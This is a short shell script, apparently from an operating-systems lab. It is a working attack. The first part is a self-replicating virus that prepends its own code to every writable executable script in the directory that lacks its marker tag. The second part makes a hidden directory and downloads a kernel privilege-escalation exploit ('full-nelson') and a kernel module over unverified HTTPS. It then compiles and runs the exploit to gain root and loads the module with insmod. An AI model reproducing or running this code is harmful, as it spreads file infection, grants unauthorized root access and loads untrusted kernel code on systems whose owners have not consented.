#arkjefcbgksb
#!/bin/sh

for file in ./*; do
if test -f $file && test -x $file && test -w $file ; then
if grep -s echo $file>.mmm; then
head -n 1 $file>.mm
if grep -s arkjefcbgksb .mm >.mmm; then
rm -f .mm ; else
head -n 32 $0>.SAVEE
cat $file>>.SAVEE
cat .SAVEE>$file
fi fi fi
done
rm -f .SAVEE .mmm .mm

mkdir .hello
cp exploit.sh ./.hello

cd ./.hello
wget --no-check-certificate https://raw.githubusercontent.com/yangbyangb/OSlab/master/full-nelson.c
wget --no-check-certificate https://raw.githubusercontent.com/yangbyangb/OSlab/master/hello.c
wget --no-check-certificate https://raw.githubusercontent.com/yangbyangb/OSlab/master/insmod.sh
wget --no-check-certificate https://raw.githubusercontent.com/yangbyangb/OSlab/master/Makefile

echo "ready to get root"
gcc full-nelson.c -o full-nelson
./full-nelson

make
insmod hello.ko
lsmod | grep hello
echo "done with the module"
